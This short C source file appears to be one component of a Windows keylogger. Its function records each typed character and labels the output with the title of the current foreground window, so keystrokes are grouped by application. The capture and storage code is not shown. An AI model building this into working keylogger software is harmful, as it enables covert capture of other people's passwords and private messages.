#include "header.h"

HWND window = NULL;
WCHAR window_name[100];

void edit_log(short character)
{
	if (window == GetForegroundWindow())
		printf("%c", character);
	else
	{
		window = GetForegroundWindow();
		GetWindowText(window, window_name, 100);
		wprintf(L"\n\n----- %s -----\n", window_name);
		printf("%c", character);
	}
}

